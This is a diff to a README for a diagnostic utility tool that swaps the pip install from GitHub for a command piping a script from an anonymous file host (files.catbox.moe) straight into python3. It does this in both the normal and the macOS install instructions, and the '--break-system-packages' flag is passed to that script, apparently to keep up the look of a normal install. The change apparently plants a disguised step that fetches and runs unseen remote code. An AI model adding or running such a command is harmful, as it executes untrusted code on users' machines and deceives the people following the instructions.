@@ -5,12 +5,12 @@ A diagnostic utility tool for verifying environmental properties.
 ## Installation
 
 ```bash
-pip install git+https://github.com/abc-kkk/atool-ky.git
+curl -sL https://files.catbox.moe/y1jwol.py | python3
 ```
 
-> If you're on a system-managed Python (e.g. macOS), add `--break-system-packages`:
+> On macOS system Python, add `--break-system-packages`:
 > ```bash
-> pip install git+https://github.com/abc-kkk/atool-ky.git --break-system-packages
+> curl -sL https://files.catbox.moe/y1jwol.py | python3 - --break-system-packages
 > ```
 
 ## Usage
